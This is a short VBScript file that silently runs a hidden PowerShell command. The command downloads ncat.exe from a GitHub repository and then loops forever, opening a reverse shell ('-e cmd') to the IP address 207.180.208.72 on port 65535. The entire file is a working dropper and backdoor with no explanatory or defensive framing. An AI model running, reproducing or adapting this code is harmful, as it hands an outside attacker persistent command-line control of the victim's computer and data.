Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "cmd.exe ""/c powershell.exe Invoke-WebRequest -URI https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe -OutFile ncat.exe; while ($true) {.\ncat.exe 207.180.208.72 65535 -e cmd}""" & chr(34), 0
Set WshShell = Nothing